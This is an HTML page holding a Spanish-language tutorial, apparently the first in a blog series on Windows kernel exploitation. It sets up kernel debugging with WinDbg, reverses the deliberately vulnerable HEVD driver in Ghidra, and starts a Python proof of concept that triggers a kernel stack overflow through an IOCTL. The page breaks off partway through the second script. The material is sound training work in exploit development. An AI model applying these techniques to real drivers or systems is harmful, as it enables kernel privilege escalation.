<!doctype html>
<html lang="en-us">
  <head>
    <title>0x00 - Introducción a Windows Kernel Explotación // </title>
    <link rel="shortcut icon" href="/favicon.ico" />
    <meta charset="utf-8" />
    <meta name="generator" content="Hugo 0.131.0">
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="author" content="John Doe" />
    <meta name="description" content="" />
    <link rel="stylesheet" href="/css/main.min.5b1fcc8902588589c4767187402a3c29f8b8d7a6fdef6d9f8f77045bb0d14fee.css" />
    

    
  


    
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="0x00 - Introducción a Windows Kernel Explotación">
  <meta name="twitter:description" content="Esta publicación será la primera de un series donde te guiaré al mundo de Windows Kernel Explotación. Mi papa antes dicia, “no se nace aprendido”. Como todo en la vida hay que empezar por algún lado. El objetivo de esta series es comenzar en Windows 7 (x86) y terminar en Windows 11 (x64). Hoy vamos usar Windows 7 (x86) y Windows 10 (x64).
Para empezar, baja estos programas:
Programa de Virtualización: Esto puede ser cualquier desde VirtualBox a VMWare.">

    <meta property="og:url" content="https://wetw0rk.github.io/posts/0x00-introducci%C3%B3n-a-windows-kernel-explotaci%C3%B3n/">
  <meta property="og:site_name" content="wetw0rk">
  <meta property="og:title" content="0x00 - Introducción a Windows Kernel Explotación">
  <meta property="og:description" content="Esta publicación será la primera de un series donde te guiaré al mundo de Windows Kernel Explotación. Mi papa antes dicia, “no se nace aprendido”. Como todo en la vida hay que empezar por algún lado. El objetivo de esta series es comenzar en Windows 7 (x86) y terminar en Windows 11 (x64). Hoy vamos usar Windows 7 (x86) y Windows 10 (x64).
Para empezar, baja estos programas:
Programa de Virtualización: Esto puede ser cualquier desde VirtualBox a VMWare.">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-12-01T00:00:00+00:00">
    <meta property="article:modified_time" content="2024-12-01T00:00:00+00:00">


  </head>
  <body>
    <header class="app-header">
      <a href="https://wetw0rk.github.io/"><img class="app-header-avatar" src="/me.png" alt="John Doe" /></a>
      <span class="app-header-title"></span>
      <p> </p>
      <div class="app-header-social">
        
          <a href="https://github.com/wetw0rk" target="_blank" rel="noreferrer noopener me">
            <svg class="icon icon-brand-github" viewBox="0 0 24 24" fill="currentColor"><title>GitHub</title><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
          </a>
        
          <a href="https://twitter.com/wetw0rk_bot" target="_blank" rel="noreferrer noopener me">
            <svg class="icon icon-brand-x" viewBox="0 0 24 24" fill="currentColor"><title>X</title><path d="M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z"/></svg>
          </a>
        
      </div>
    </header>
    <main class="app-container">
      
  <article class="post">
    <header class="post-header">
      <h1 class ="post-title">0x00 - Introducción a Windows Kernel Explotación</h1>
      <div class="post-meta">
        <div>
          <svg class="icon icon-calendar" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>calendar</title><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>
          Dec 1, 2024
        </div>
        <div>
          <svg class="icon icon-clock" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>clock</title><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
          16 min read
        </div>
      </div>
    </header>
    <div class="post-content">
      <p>Esta publicación será la primera de un series donde te guiaré al mundo de Windows Kernel Explotación. Mi papa antes dicia, &ldquo;no se nace aprendido&rdquo;. Como todo en la vida hay que empezar por algún lado. El objetivo de esta series es comenzar en Windows 7 (x86) y terminar en Windows 11 (x64). Hoy vamos usar Windows 7 (x86) y Windows 10 (x64).</p>
<p>Para empezar, baja estos programas:</p>
<ul>
<li><a href="https://youtu.be/wX75Z-4MEoM?si=JgQvGaH5QF0ptqI4">Programa de Virtualización</a>: Esto puede ser cualquier desde VirtualBox a VMWare. Dejaré cual programa de virtualización usar en tus manos.</li>
<li><a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-tools">WinDbg</a>: Esta aplicación nos servirá como instrumento para interactuar con el Kernel, es importante que lo bajes de el Windows Driver Kit y NO el WinDbg Preview para este serie.</li>
<li><a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver">HEVD</a>: Para este series usaré HEVD v3.00 para demosrar las vulnerabilidades. Al escribir este series, es el versión mas nuevo. HEVD es un controlador (driver) programado para ser intencionalmente vulnerable.</li>
<li><a href="https://www.osronline.com/article.cfm%5Earticle=157.htm">OSRLOADER</a>: Como HEVD is un controlador, necesitamos una forma de cargarlo en el sistema de operación. Para hacer esto usaremos la aplicación OSRLOADER.</li>
<li><a href="https://www.python.org/">Python</a>: Al escribir esto, usé versión 3.11.5 sin embargo, cualquier versión debería estar bien.</li>
<li><a href="https://ghidra-sre.org/">Ghidra</a>: Ghidra será nuestra herramienta para conducta ingeniería inversa (reverse engineering). Si tienes IDA Pro, estas bienvenido a usarlo :)</li>
<li><a href="https://github.com/wetw0rk/Sickle">Sickle</a>: Esta será la herramienta que utilizaremos para generar shellcode. Si estás leyendo esto en 2024, es probable que el nuevo versión no esta listo. Por esta razón, usa la última rama no la versión mas nueva (simplemente clona el repositorio).</li>
</ul>
<p>Es importante saber, he estructurado estas guías para llevarte de Exploit Developer a Kernel Exploit Developer. Si nunca has escrito una cadena de ROP, o estas completamente perdido con protecciones de la memoria moderna. Te recomiendo que empezes con explotación de Userland.</p>
<p>Si no tienes dinero, te recomiendo lo siguiente:</p>
<ul>
<li><a href="https://www.corelan.be/index.php/search/exploit+writing+tutorial+part+1/">Corelan Tutorials</a>: Corelan fue una de mis inspiraciones para hacer estas publicaciones. Cuando comencé mi viaje por primera vez en Exploit Development yo leí tutoriales 1-11. Todo presentado en ellos sigue siendo relevante a haste día. No dejes que la falta de sistemas modernas te detenga, conceptos de Windows XP se aplica a Windows 11.</li>
<li><a href="https://github.com/wetw0rk/MBE-NOTES">Modern Binary Exploitation</a>: Este es un curso escrito por los creadores de RET2 publicada gratis. Con el permiso de los autores del curso, tambien publiqué mis notas en GitHub. Una vez más, esto es para sistemas más antiguos de Linux (x86), pero el conocimiento es transferible.</li>
</ul>
<p>Si prefieres algo más moderno, y puedes, te recomiendo estos cursos:</p>
<ul>
<li><a href="https://www.corelan-training.com/">Corelan Training</a>: Corelan también ofrece cursos para systemas modernas. Así que si prefieres pagar, la clase de <code>Expert Level Stack</code> debería ser un comienzo sólido para explotación de Windows. Yo tomé su <code>Heap Masterclass</code> en 2019 y planeo tomarlo de nuevo.</li>
<li><a href="https://wargames.ret2.systems/">RET2 Wargames</a>: RET2 Wargames es un curso que tomé y completé en 2024. No puedo decir lo suficiente, este curso lo recomiendo. Además, una vez completé el curso, me comuniqué con los autores del curso y me permitieron publicar mis notas sobre su antiguo curso MBE. Si esto no es suficiente para apoyarlos, yo escribí en mi experiencia <a href="https://www.linkedin.com/pulse/ret2-systems-wargames-review-milton-valencia-0udrf/">&gt;aqi&lt;</a></li>
</ul>
<p>Que yo sepa, estos cursos son sólo en inglés. Sin embargo, sé que el lenguaje de programación es universal. Con eso, podemos comenzar!</p>
<h1 id="table-of-contents">Table of Contents</h1>
<ul>
<li><a href="#trabajando-con-el-kernel-y-windbg">Trabajando con el Kernel y WinDbg</a>
<ul>
<li><a href="#preparando-la-computadora-que-vamos-a-atacar-debugee">Preparando la Computadora Que Vamos a Atacar (Debugee)</a></li>
<li><a href="#configurando-el-sistema-de-virtualizaci%C3%B3n">Configurando el Sistema de Virtualización</a></li>
<li><a href="#configurar-la-host-computadora-debugger">Configurar la &ldquo;host&rdquo; Computadora (Debugger)</a></li>
</ul>
</li>
<li><a href="#introducci%C3%B3n-a-hevd">Introducción a HEVD</a>
<ul>
<li><a href="#trabajando-con-conductores-de-sistemas">Trabajando con Conductores de Sistemas</a></li>
<li><a href="#trabajando-con-hevd-ghidra-y-windbg">Trabajando con HEVD, Ghidra y WinDbg</a></li>
</ul>
</li>
<li><a href="#explotaci%C3%B3n-de-un-stack-overflow-windows-7---x86">Explotación de un &ldquo;Stack Overflow&rdquo; (Windows 7 - x86)</a>
<ul>
<li><a href="#identificando-la-vulnerabilidad">Identificando la Vulnerabilidad</a></li>
<li><a href="#entendiendo-bufferoverflowstackioctlhandler">Entendiendo BufferOverflowStackIoctlHandler</a></li>
<li><a href="#entendiendo-triggerbufferoverflowstack">Entendiendo TriggerBufferOverflowStack</a></li>
<li><a href="#kernel-shellcode">Kernel Shellcode??</a></li>
<li><a href="#arreglando-el-choque">Arreglando el Choque</a></li>
</ul>
</li>
<li><a href="#recursos">Recursos</a></li>
</ul>
<h1 id="trabajando-con-el-kernel-y-windbg">Trabajando con el Kernel y WinDbg</h1>
<p>Al leer este tutorial, es importante que reconozcas dos definiciones. Primero, la computadora donde vamos a estar trabajando se llama la <code>host computer</code> o <code>debugger machine</code>. Mientras, la computadora que vamos a depurar, se llama la <code>target computer</code> o <code>debugee machine</code>. El sistema <code>debugee machine</code>, estará dentro de un programa de virtualización.</p>
<h2 id="preparando-la-computadora-que-vamos-a-atacar-debugee">Preparando la Computadora Que Vamos a Atacar (Debugee)</h2>
<p>Para empezar, encende el debugee machine y abre el &ldquo;command prompt&rdquo; con permisos de un administrador y ejecuta lo siguiente:</p>
<pre tabindex="0"><code>C:\Windows\system32&gt;bcdedit /copy {current} /d &#34;Kernel Debugging On&#34;
The entry was successfully copied to {3709675a-4632-11ee-b00a-b3e46a698b2a}.

C:\Windows\system32&gt;bcdedit /debug {3709675a-4632-11ee-b00a-b3e46a698b2a} on
The operation completed successfully.
</code></pre><p>Esto generará una entrada en la &ldquo;boot table&rdquo; que tiene la habilitada de depuración (debug). Nosotras podemos confirmar esto ejecutando <code>bcdedit</code>.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/boot.png" alt="alt text"></p>
<p>Después de crear la entrada (ahora tiene la habilidad de depurar o &ldquo;debug&rdquo;), abre la aplicación <code>System Configuration</code>. Una vez lo has abierto, ve a la pestaña de <code>Boot</code>. Clicia en la entrada recién agregada y clickia <code>Advanced Options...</code>. Después copia los ajustes como demuestro aqi (yo usé &ldquo;COM2&rdquo;). Es importante que el &ldquo;baud rate&rdquo; está sincronizado con el <code>host computer</code> que configuraremos para ser 115200.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/com_two.png" alt="alt text"></p>
<p>Clickia <code>OK</code>, <code>Apply</code>, <code>OK</code>, después encender y apaga el sistema de virtualización (VM).</p>
<h2 id="configurando-el-sistema-de-virtualización">Configurando el Sistema de Virtualización</h2>
<p>Apaga el VM, después ábre la configuración de el VM y agregar un &ldquo;Serial Port&rdquo;, una vez añadido, utilice la configuración presentada aquí:</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/vmware.png" alt="alt text"></p>
<p>La próxima vez que lo arranques, clicia la nueva entrada; sin embargo ahora podemos pasar al siguiente paso.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/entry.png" alt="alt text"></p>
<h2 id="configurar-la-host-computadora-debugger">Configurar la &ldquo;host&rdquo; Computadora (Debugger)</h2>
<p>Suponiendo que la <code>target computer</code> fue configurada correctamente, abre el <code>WinDbg</code> apropiado, en mi caso <code>WinDbg (x64)</code>. Una vez abierto, clicia <code>File</code> y <code>Kernel Debug...</code>.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/kernel_host.png" alt="alt text"></p>
<p>Una vez lo as seleccionado, una ventana se va abrir, vete a la pestaña <code>COM</code> y escribir lo siguiente (cómo programaste tu configuración):</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/port.png" alt="alt text"></p>
<p>Luego presiona &ldquo;OK&rdquo;. Si no lo has hecho, arrancar la computadora que vas atacar y una vez que hayamos entrado a la nueva entrada que creamos antes, deberías ver lo siguiente:</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/done.png" alt="alt text"></p>
<p>Pon te orgulloso, as configurado tu primer &ldquo;Kernel Debugger&rdquo;! Ahora&hellip; como ejercicio, hazlo de nuevo en Windows 7.</p>
<h1 id="introducción-a-hevd">Introducción a HEVD</h1>
<p>Has aprendido como configurar &ldquo;kernel debugging&rdquo;, con eso, confirmar que as bajado HEVD, OSRLOADER, y Python a el <code>target computer</code> or <code>debugee machine</code>.</p>
<p>La primera ves que abres HEVD, vas a ejecutar <code>OSRLOADER.exe</code>, asegúrete ejecutarlo como administrador. Deberías ver lo siguiente:</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/osrloader.png" alt="alt text"></p>
<p>Una vez ejecutado, clicia <code>Browse</code> y ve al HEVD conductor adecuado y abre lo.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/loadit.png" alt="alt text"></p>
<p>En orden para asegurar que el conductor se va ejecutar cuando arrancamos la computadora, selecciona &ldquo;Automatic&rdquo; de la pestaña de la configuración &ldquo;Service Start&rdquo;. Deberías ver lo siguiente:</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/success.png" alt="alt text"></p>
<p>Volviendo a nuestro debugger, si pausas ejecución y listas los módulos cargados, deberías ver HEVD.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/windbg.png" alt="alt text"></p>
<p>Lo siguiente que debemos hacer es arreglar los simbolos.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/sym.png" alt="alt text"></p>
<p>Toma nota del camino: <code>C:\projects\hevd\build\driver\vulnerable\x86\HEVD\HEVD.pdb</code> necesitaremos crear lo en el <code>host computer</code>, y copiar todos los documentos a el como demostrado aqi:</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/pathsetup.png" alt="alt text"></p>
<p>Después, enciende y apaga la máquina. Si todo salio bien, deberías ver lo siguiente:</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/symload.png" alt="alt text"></p>
<h2 id="trabajando-con-conductores-de-sistemas">Trabajando con Conductores de Sistemas</h2>
<p>Conductores de sistemas o &ldquo;Device Drivers&rdquo; son objetos de el Kernel, lo que significa esto es que no podemos modificarlos directamente desde Userland. Para interactuar con los conductores, nosotros necesitamos un HANDLE para ellos. Para hacer esto, necesitamos usar un enlace simbólico como <code>\\Driver</code> y pasar lo a <code>CreateFileA</code>.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/createfilea.png" alt="alt text"></p>
<p>Una vez que hayamos obtenido un &ldquo;handle&rdquo;, podemos usar la función <code>DeviceIoControl</code> para obtener control sobre los aparatos a través de el entrada y salida (I/O) sobre el interfaz (IOCTL). Esta interfaz, puede mandar códigos de control a el aparato, cada código de control representa una operación para que el aparato lo pueda ejecutar. Por ejemplo, un código de control le puede preguntar el aparato que ejecutar una acción como borrando el disco.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/deviceiocontrol.png" alt="alt text"></p>
<p>Ate mirar dónde podemos encontrar la información necesaria para realizar estas llamadas dentro de HEVD.</p>
<h2 id="trabajando-con-hevd-ghidra-y-windbg">Trabajando con HEVD, Ghidra y WinDbg</h2>
<p>Si cargamos <code>HEVD.sys</code> adentro de ghidra nosotros podemos ver el <code>entry point</code> de el aparato en realidad comienza en <code>DriverEntry()</code>. Esta función es la primera rutina llamado cuando el aparato esta cargado y tiene la responsabilidad de inicializando el aparato.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/entry-ghidra.png" alt="alt text"></p>
<p>Si entramos en esta función, todo se vuelve más claro.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/DriverEntry.png" alt="alt text"></p>
<p>Usemos WinDbg para ver esto, encienda y apague la máquina y pon un pausa en en el punto de entrada
antes que el aparato este cargado. Deberías yegar al pausa.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/break_entry.png" alt="alt text"></p>
<p>Si continúas a desmontar desde aqi (<code>u</code>), eventualmente deberías ver una yamada a <code>IoCreateSymbolicLink</code>.</p>
<p>Esta función esta responsable de crear el enlace simbólico que nosotras podemos llamar de Userland.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/IoCreateSymLink.png" alt="alt text"></p>
<p>Si imprimimos el primer argumento, podemos ver el nombre del enlace simbólico. En este caso va ser <code>HackSysExtremeVulnerableDriver</code>.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/arg1_create.png" alt="alt text"></p>
<p>Nosotras podemos ignorar <code>\\DosDevices</code> este es un espacio especial de nombre que Windows usa para el aparato. Para interactuar con él vamos usar <code>\\.\HackSysExtremeVulnerableDriver</code>, usamos <code>\\.\</code> porque esto es en el espacio &ldquo;Win32 device namespace&rdquo; o &ldquo;raw devive namespace&rdquo; que podemos usar desde userland. Aunque no necesitábamos pasar por esto, quería ver qué argumentos se pasarían a la función cuando creando un enlace simbólico.</p>
<p>Entonces, ¿cómo enviamos información a HEVD? Como mencioné anteriormente, vamos usar <code>DeviceIoControl</code>.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/deviceiocontrol.png" alt="alt text"></p>
<p>Lo principal en lo que queremos concentrarnos es el <code>dwIoControlCode</code></p>
<p>Esto sera la operación que nosotros queremos el aprato que ejecute. Estos operacións o solicitudes son mandados al aparato por un I/O paquete también conocido como <code>IRPs</code>.</p>
<p>Mirando la descompilación en Ghidra en <code>línea 31</code> miramos que <code>param_1-&gt;MajorFunction[0xe]</code> esta establecido con <code>IrpDeviceIoCtlHandler</code>. Por qué? Si miramos MSDN vemos la definición de estructura para este objeto en particular (__DRIVER_OBJECT).</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/DRIVER_OBJECT.png" alt="alt text"></p>
<p>A poner esto indica que IrpDeviceIoCtlHandler será la &ldquo;función&rdquo; que controla cómo interactuar con el aprato. Esto lo sabemos por el &ldquo;IRP Major Function Code 0xE&rdquo; (Mira esto como la función principal &ldquo;main&rdquo;):</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/irp_codes.png" alt="alt text"></p>
<p>Si abres <code>IrpDeviceIoCtlHandler</code> sobre Ghidra se nos presenta la descompilación de la función. Aquí vemos que HEVD usa un &ldquo;switch&rdquo; para manejar nuestro mensajes de I/O.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/codes.png" alt="alt text"></p>
<p>Con eso, tenemos todo lo que necesitamos para comenzar Exploit Development.</p>
<h1 id="explotación-de-un-stack-overflow-windows-7---x86">Explotación de un &ldquo;Stack Overflow&rdquo; (Windows 7 - x86)</h1>
<p>Para facilitar las cosas, ¿por qué no empezar con una vulnerabilidad tradicional? Un &ldquo;buffer overflow&rdquo;. Para ser las cosas mas facil tambien vamos usar <code>python</code>. Sin embargo, tenga en cuenta que más adelante en esta serie vamos usar <code>C</code> y tal vez <code>C++</code>.</p>
<h2 id="identificando-la-vulnerabilidad">Identificando la Vulnerabilidad</h2>
<p>Ya que tenemos símbolos ingeniería inversa será facil. Dentro <em>IrpDeviceIoCtlHandler</em> podemos ver el &ldquo;stack overflow&rdquo; puede ser activado a través de el codigo I/O <strong>0x222003</strong>.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/code_7.png" alt="alt text"></p>
<p>Si entramos a la función <em>BufferOverflowStackIoctlHandler</em>.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/overflow_7.png" alt="alt text"></p>
<p>Hacemos una yamada a <em>TriggerBufferOverflowStack</em>.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/memcpy_7.png" alt="alt text"></p>
<p>Hagamos nuestro prueba de concepto (PoC) para ver que pasa cuando entramos en esta función.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> ctypes <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>GENERIC_READ          <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x80000000</span>
</span></span><span style="display:flex;"><span>GENERIC_WRITE         <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40000000</span>
</span></span><span style="display:flex;"><span>OPEN_EXISTING         <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000003</span>
</span></span><span style="display:flex;"><span>FILE_ATTRIBUTE_NORMAL <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000080</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NULL <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  kernel32 <span style="color:#f92672">=</span> windll<span style="color:#f92672">.</span>kernel32
</span></span><span style="display:flex;"><span>  hHEVD <span style="color:#f92672">=</span> kernel32<span style="color:#f92672">.</span>CreateFileA(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">HackSysExtremeVulnerableDriver&#34;</span>,
</span></span><span style="display:flex;"><span>                               (GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE),
</span></span><span style="display:flex;"><span>                               <span style="color:#ae81ff">0x00</span>,
</span></span><span style="display:flex;"><span>                               NULL,
</span></span><span style="display:flex;"><span>                               OPEN_EXISTING,
</span></span><span style="display:flex;"><span>                               FILE_ATTRIBUTE_NORMAL,
</span></span><span style="display:flex;"><span>                               NULL)
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>):
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  buffer <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;wetw0rk&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#34;[*] Calling control code 0x222003&#34;</span>)
</span></span><span style="display:flex;"><span>  kernel32<span style="color:#f92672">.</span>DeviceIoControl(hHEVD,
</span></span><span style="display:flex;"><span>                           <span style="color:#ae81ff">0x222003</span>,
</span></span><span style="display:flex;"><span>                           buffer,
</span></span><span style="display:flex;"><span>                           len(buffer),
</span></span><span style="display:flex;"><span>                           NULL,
</span></span><span style="display:flex;"><span>                           <span style="color:#ae81ff">0x00</span>,
</span></span><span style="display:flex;"><span>                           byref(c_ulong()),
</span></span><span style="display:flex;"><span>                           NULL)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>main()
</span></span></code></pre></div><h2 id="entendiendo-bufferoverflowstackioctlhandler">Entendiendo BufferOverflowStackIoctlHandler</h2>
<p>Establecer una pausa en <em>BufferOverflowStackIoctlHandler</em>.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/bu_bof_func_7.png" alt="alt text"></p>
<p>Intentemos ver qué se pasa a esta función, podemos empesar bajando el &ldquo;stack frame&rdquo;.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/stack_frame_7.png" alt="alt text"></p>
<p>Mirando <em>BufferOverflowStackIoctlHandler</em> dentro Ghidra nos dice que estos parámetros son de tipo <em>_IRP</em> y <em>_IO_STACK_LOCATION</em> (también vimos esto en el &ldquo;stack frame&rdquo; con WinDbg).</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/overflow_7.png" alt="alt text"></p>
<p>Sin embargo, en realidad sólo estamos usando <em>param_2</em> de el tipo <em>_IO_STACK_LOCATION</em>.</p>
<p>Podemos encontrar la definición de esta estructura usando la documentación de <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_io_stack_location">MS</a>, sin embargo es largo, entonces solo lo relevante para nosotros esta enseñado.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _IO_STACK_LOCATION {
</span></span><span style="display:flex;"><span>  UCHAR                  MajorFunction;
</span></span><span style="display:flex;"><span>  UCHAR                  MinorFunction;
</span></span><span style="display:flex;"><span>  UCHAR                  Flags;
</span></span><span style="display:flex;"><span>  UCHAR                  Control;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">union</span> {
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> {
</span></span><span style="display:flex;"><span>      ULONG                   OutputBufferLength;
</span></span><span style="display:flex;"><span>      ULONG POINTER_ALIGNMENT InputBufferLength;
</span></span><span style="display:flex;"><span>      ULONG POINTER_ALIGNMENT FsControlCode;
</span></span><span style="display:flex;"><span>      PVOID                   Type3InputBuffer;
</span></span><span style="display:flex;"><span>    } FileSystemControl;
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>  } Parameters;
</span></span><span style="display:flex;"><span>  PDEVICE_OBJECT         DeviceObject;
</span></span><span style="display:flex;"><span>  PFILE_OBJECT           FileObject;
</span></span><span style="display:flex;"><span>  PIO_COMPLETION_ROUTINE CompletionRoutine;
</span></span><span style="display:flex;"><span>  PVOID                  Context;
</span></span><span style="display:flex;"><span>} IO_STACK_LOCATION, <span style="color:#f92672">*</span>PIO_STACK_LOCATION;
</span></span></code></pre></div><p>Si miramos esto en WinDbg, miramos que <strong>(param_2-&gt;Parameters).FileSystemControl.Type3InputBuffer</strong> es el puntero a nuestro porción de memoria (&ldquo;buffer&rdquo;).</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/type3inputbuffer_7.png" alt="alt text"></p>
<p>Entonces, cuando entramos a <em>TriggerBufferOverflowStack</em>, podemos estar seguros de que nuestra información esta pasado como <em>param_1</em>.</p>
<h2 id="entendiendo-triggerbufferoverflowstack">Entendiendo TriggerBufferOverflowStack</h2>
<p>Ahora que entendimos que <em>param_1</em> de <em>TriggerBufferOverflowStack</em> contiene nuestra memoria, la explotación parece fácil</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/memcpy_7.png" alt="alt text"></p>
<p>Simplemente tenemos que mandar mas de 2060 &ldquo;bytes&rdquo; y deberíamos tener curropción de la memoria! Agregar los cambios al PoC y mando lo!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> ctypes <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>GENERIC_READ          <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x80000000</span>
</span></span><span style="display:flex;"><span>GENERIC_WRITE         <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40000000</span>
</span></span><span style="display:flex;"><span>OPEN_EXISTING         <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000003</span>
</span></span><span style="display:flex;"><span>FILE_ATTRIBUTE_NORMAL <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000080</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NULL <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>
